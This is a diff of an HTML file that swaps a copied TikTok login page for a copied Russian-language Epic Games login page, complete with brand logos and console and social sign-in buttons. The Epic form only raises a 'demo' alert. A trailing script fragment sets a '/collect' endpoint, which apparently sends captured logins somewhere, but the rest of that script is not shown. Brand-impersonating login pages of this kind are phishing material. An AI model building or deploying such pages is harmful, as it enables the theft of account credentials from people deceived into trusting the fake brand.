@@ -1,231 +1,356 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Log in | TikTok</title>
-<style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-    background: #fff;
-    color: #161823;
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-  }
-  header {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding: 16px 24px;
-    height: 60px;
-  }
-  .logo {
-    display: flex;
-    align-items: center;
-    gap: 6px;
-    text-decoration: none;
-    color: #161823;
-    font-weight: 700;
-    font-size: 22px;
-  }
-  .logo svg { width: 28px; height: 28px; }
-  .help {
-    font-size: 14px;
-    color: #161823;
-    text-decoration: none;
-    display: flex;
-    align-items: center;
-    gap: 4px;
-  }
-  .help:hover { text-decoration: underline; }
-  main {
-    flex: 1;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    padding: 0 16px 40px;
-  }
-  .card {
-    width: 100%;
-    max-width: 375px;
-  }
-  h1 {
-    font-size: 32px;
-    font-weight: 700;
-    text-align: center;
-    margin-bottom: 24px;
-    letter-spacing: -0.5px;
-  }
-  .tabs {
-    display: flex;
-    justify-content: space-between;
-    margin-bottom: 16px;
-    font-size: 15px;
-    font-weight: 600;
-  }
-  .tabs span {
-    color: #161823;
-    cursor: pointer;
-  }
-  .tabs .inactive {
-    color: #8a8b91;
-    font-weight: 400;
-  }
-  .tabs .inactive:hover { color: #161823; }
-  input[type="text"],
-  input[type="password"] {
-    width: 100%;
-    height: 48px;
-    border: none;
-    border-radius: 4px;
-    background: #f1f1f2;
-    padding: 0 12px;
-    font-size: 16px;
-    color: #161823;
-    outline: none;
-    margin-bottom: 12px;
-  }
-  input::placeholder { color: #8a8b91; }
-  input:focus { background: #e8e8e9; }
-  .pass-wrap {
-    position: relative;
-  }
-  .pass-wrap input { padding-right: 44px; }
-  .eye {
-    position: absolute;
-    right: 12px;
-    top: 50%;
-    transform: translateY(-50%);
-    width: 20px;
-    height: 20px;
-    cursor: pointer;
-    opacity: 0.6;
-  }
-  .eye:hover { opacity: 1; }
-  .forgot {
-    display: block;
-    font-size: 14px;
-    color: #161823;
-    text-decoration: none;
-    margin: 4px 0 20px;
-  }
-  .forgot:hover { text-decoration: underline; }
-  .btn {
-    width: 100%;
-    height: 48px;
-    border: none;
-    border-radius: 4px;
-    font-size: 16px;
-    font-weight: 600;
-    cursor: pointer;
-    background: #f1f1f2;
-    color: #8a8b91;
-    transition: all 0.15s;
-  }
-  .btn.active {
-    background: #fe2c55;
-    color: #fff;
-  }
-  .btn.active:active { transform: scale(0.98); }
-  .back {
-    display: block;
-    text-align: center;
-    margin-top: 28px;
-    font-size: 15px;
-    color: #161823;
-    text-decoration: none;
-  }
-  .back:hover { text-decoration: underline; }
-  footer {
-    border-top: 1px solid #e3e3e4;
-    padding: 16px 24px;
-    display: flex;
-    justify-content: center;
-    font-size: 14px;
-    color: #8a8b91;
-  }
-  footer a {
-    color: #fe2c55;
-    text-decoration: none;
-    margin-left: 4px;
-    font-weight: 600;
-  }
-  footer a:hover { text-decoration: underline; }
-  .bottom-bar {
-    background: #000;
-    color: #fff;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    padding: 10px 24px;
-    font-size: 13px;
-  }
-  .lang {
-    border: 1px solid #fff;
-    padding: 6px 12px;
-    border-radius: 2px;
-    cursor: default;
-  }
-  .loader {
-    display: none;
-    width: 40px;
-    height: 40px;
-    border: 3px solid #f1f1f2;
-    border-top-color: #fe2c55;
-    border-radius: 50%;
-    animation: spin .7s linear infinite;
-    margin: 60px auto;
-  }
-  @keyframes spin { to { transform: rotate(360deg); } }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход в Epic Games</title>
+    <style>
+        /* Сброс стилей */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* Основная карточка */
+        .login-container {
+            background-color: #18181c;
+            width: 100%;
+            max-width: 480px;
+            padding: 40px 30px;
+            border-radius: 8px;
+            border: 1px solid #2a2a2a;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+        }
+
+        /* Логотип */
+        .epic-logo {
+            width: 50px;
+            height: auto;
+            margin: 0 auto 20px;
+            display: block;
+        }
+
+        h1 {
+            font-size: 20px;
+            margin-bottom: 25px;
+            font-weight: 600;
+        }
+
+        /* Поля ввода */
+        .input-group {
+            margin-bottom: 15px;
+            position: relative; /* Для позиционирования глазика */
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            background-color: #202024;
+            border: 1px solid #333;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input:focus {
+            border-color: #0074E4;
+        }
+
+        input::placeholder {
+            color: #888;
+        }
+
+        /* Кнопка показать пароль (глазик) */
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #888;
+            cursor: pointer;
+            font-size: 14px;
+            padding: 0;
+            outline: none;
+        }
+        
+        .toggle-password:hover {
+            color: #fff;
+        }
+
+        /* Ссылка "Забыли пароль" */
+        .forgot-password {
+            text-align: right;
+            margin-bottom: 20px;
+            font-size: 12px;
+        }
+
+        /* Кнопка "Войти" */
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            background-color: #0074E4;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-bottom: 20px;
+        }
+
+        .btn-primary:hover {
+            background-color: #0062c4;
+        }
+
+        /* Ссылки */
+        a {
+            color: #0074E4;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .create-account {
+            font-size: 12px;
+            color: #ccc;
+            margin-bottom: 30px;
+            display: block;
+        }
+
+        /* Разделители и заголовки секций */
+        .divider {
+            height: 1px;
+            background-color: #333;
+            margin: 20px 0;
+            border: none;
+        }
+
+        .section-title {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 5px;
+            color: #eee;
+        }
+
+        .section-subtitle {
+            font-size: 12px;
+            color: #aaa;
+            margin-bottom: 15px;
+        }
+
+        /* Сетка кнопок входа */
+        .grid-buttons {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .social-btn {
+            background-color: #202024;
+            border: 1px solid #333;
+            border-radius: 4px;
+            padding: 15px 5px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: background 0.2s;
+            height: 80px;
+        }
+
+        .social-btn:hover {
+            background-color: #2a2a2e;
+        }
+
+        /* Иконки (имитация кружков) */
+        .icon-circle {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+            color: #fff;
+        }
+
+        /* Цвета иконок */
+        .icon-ps { background-color: #0070d1; }
+        .icon-xbox { background-color: #107c10; }
+        .icon-switch { background-color: #e60012; }
+        .icon-google { background-color: #fff; color: #333; }
+        .icon-steam { background-color: #171a21; }
+        .icon-disney { background-color: #fff; color: #113ccf; }
+        .icon-apple { background-color: #fff; color: #000; }
+        .icon-fb { background-color: #1877f2; }
+        .icon-lego { background-color: #ffcf00; color: #d01012; }
+        .icon-vk { background-color: #0077ff; }
+
+        .btn-label {
+            font-size: 9px;
+            color: #ccc;
+            text-align: center;
+            line-height: 1.2;
+        }
+
+        /* Футер */
+        .footer-links {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .footer-links a {
+            font-size: 12px;
+        }
+
+    </style>
 </head>
 <body>
-<header>
-  <a class="logo" href="#">
-    <svg viewBox="0 0 28 28" fill="none">
-      <path d="M19.5 9.5c1.4 1.1 3.1 1.8 5 1.9V8.2c-1.1-.1-2.2-.5-3.1-1.2V15c0 3.9-3.1 7-7 7s-7-3.1-7-7 3.1-7 7-7c.4 0 .7 0 1.1.1v3.1c-.3-.1-.7-.1-1.1-.1-2.2 0-4 1.8-4 4s1.8 4 4 4 4-1.8 4-4V2h3.1c.1 1.9.8 3.6 1.9 5z" fill="#25F4EE"/>
-      <path d="M19.5 9.5c1.4 1.1 3.1 1.8 5 1.9V8.2c-1.1-.1-2.2-.5-3.1-1.2V15c0 3.9-3.1 7-7 7s-7-3.1-7-7 3.1-7 7-7c.4 0 .7 0 1.1.1v3.1c-.3-.1-.7-.1-1.1-.1-2.2 0-4 1.8-4 4s1.8 4 4 4 4-1.8 4-4V2h3.1c.1 1.9.8 3.6 1.9 5z" fill="#FE2C55" transform="translate(1.2,0)"/>
-      <path d="M19.5 9.5c1.4 1.1 3.1 1.8 5 1.9V8.2c-1.1-.1-2.2-.5-3.1-1.2V15c0 3.9-3.1 7-7 7s-7-3.1-7-7 3.1-7 7-7c.4 0 .7 0 1.1.1v3.1c-.3-.1-.7-.1-1.1-.1-2.2 0-4 1.8-4 4s1.8 4 4 4 4-1.8 4-4V2h3.1c.1 1.9.8 3.6 1.9 5z" fill="#000"/>
-    </svg>
-    TikTok
-  </a>
-  <a class="help" href="#">Feedback and help</a>
-</header>
 
-<main>
-  <div class="card" id="formCard">
-    <h1>Log in</h1>
-    <div class="tabs">
-      <span>Email or username</span>
-      <span class="inactive">Log in with phone</span>
+    <div class="login-container">
+        
+        <!-- Логотип (убедитесь, что файл epic-logo.png лежит рядом) -->
+        <img src="epic-logo.png" alt="Epic Games Logo" class="epic-logo">
+
+        <h1>Войти в Epic Games</h1>
+
+        <!-- Форма входа -->
+        <form id="loginForm" onsubmit="event.preventDefault(); alert('Вход выполнен! (Это демо)');">
+            
+            <!-- Поле Логин/Почта -->
+            <div class="input-group">
+                <input type="text" id="username" placeholder="Адрес электронной почты или логин" required>
+            </div>
+
+            <!-- Поле Пароль с кнопкой показать -->
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Пароль" required>
+                <button type="button" class="toggle-password" onclick="togglePassword()">👁️</button>
+            </div>
+
+            <!-- Ссылка Забыли пароль -->
+            <div class="forgot-password">
+                <a href="#">Забыли пароль?</a>
+            </div>
+
+            <button type="submit" class="btn-primary">Войти</button>
+        </form>
+
+        <div class="create-account">
+            Ещё нет учётной записи? <a href="#">Создать учётную запись</a>
+        </div>
+
+        <hr class="divider">
+
+        <!-- Секция консолей -->
+        <div class="section-title">Играли только на консоли?</div>
+        <div class="section-subtitle">Войдите, чтобы получить доступ к прогрессу и покупкам</div>
+
+        <div class="grid-buttons">
+            <div class="social-btn">
+                <div class="icon-circle icon-ps">PS</div>
+                <span class="btn-label">PlayStation Network</span>
+            </div>
+            <div class="social-btn">
+                <div class="icon-circle icon-xbox">X</div>
+                <span class="btn-label">Сеть Xbox</span>
+            </div>
+            <div class="social-btn">
+                <div class="icon-circle icon-switch">N</div>
+                <span class="btn-label">Учётная запись Nintendo</span>
+            </div>
+        </div>
+
+        <!-- Секция других способов -->
+        <div class="section-title">Другие способы входа</div>
+        <div style="margin-bottom: 15px;"></div>
+
+        <div class="grid-buttons">
+            <div class="social-btn">
+                <div class="icon-circle icon-google">G</div>
+                <span class="btn-label">Google</span>
+            </div>
+            <div class="social-btn">
+                <div class="icon-circle icon-steam">S</div>
+                <span class="btn-label">Steam</span>
+            </div>
+            <div class="social-btn">
+                <div class="icon-circle icon-disney">D</div>
+                <span class="btn-label">Disney</span>
+            </div>
+            <div class="social-btn">
+                <div class="icon-circle icon-apple">A</div>
+                <span class="btn-label">Вход с Apple</span>
+            </div>
+            <div class="social-btn">
+                <div class="icon-circle icon-fb">f</div>
+                <span class="btn-label">Facebook</span>
+            </div>
+            <div class="social-btn">
+                <div class="icon-circle icon-lego">L</div>
+                <span class="btn-label">Учётная запись LEGO</span>
+            </div>
+            <div class="social-btn">
+                <div class="icon-circle icon-vk">VK</div>
+                <span class="btn-label">ВКонтакте</span>
+            </div>
+        </div>
+
+        <!-- Футер -->
+        <div class="footer-links">
+            <a href="#">Проблемы со входом?</a>
+            <a href="#">Политика конфиденциальности</a>
+        </div>
+
     </div>
-    <form id="loginForm">
-      <input type="text" id="login" placeholder="Email or username" required autocomplete="username">
-      <div class="pass-wrap">
-        <input type="password" id="password" placeholder="Password" required autocomplete="current-password">
-        <svg class="eye" id="togglePass" viewBox="0 0 24 24" fill="none" stroke="#161823" stroke-width="2">
-          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
-          <circle cx="12" cy="12" r="3"/>
-        </svg>
-      </div>
-      <a class="forgot" href="#">Forgot password?</a>
-      <button type="submit" class="btn" id="submitBtn" disabled>Log in</button>
-    </form>
-    <a class="back" href="#">← Go back</a>
-  </div>
-  <div class="loader" id="loader"></div>
-</main>
 
-<footer>
-  Don't have an account? <a href="#">Sign up</a>
-</footer>
-<div class="bottom-bar">
-  <div class="lang">English (US)</div>
-  <div>© 2026 TikTok</div>
-</div>
+    <!-- Скрипт для показа/скрытия пароля -->
+    <script>
+        function togglePassword() {
+            var passwordInput = document.getElementById("password");
+            var toggleBtn = document.querySelector(".toggle-password");
+            
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text";
+                toggleBtn.textContent = "🔒"; // Меняем иконку на замок
+            } else {
+                passwordInput.type = "password";
+                toggleBtn.textContent = "👁️"; // Меняем обратно на глаз
+            }
+        }
+    </script>
+
+</body>
+</html>
 
 <script>
 const endpoint = "/collect";
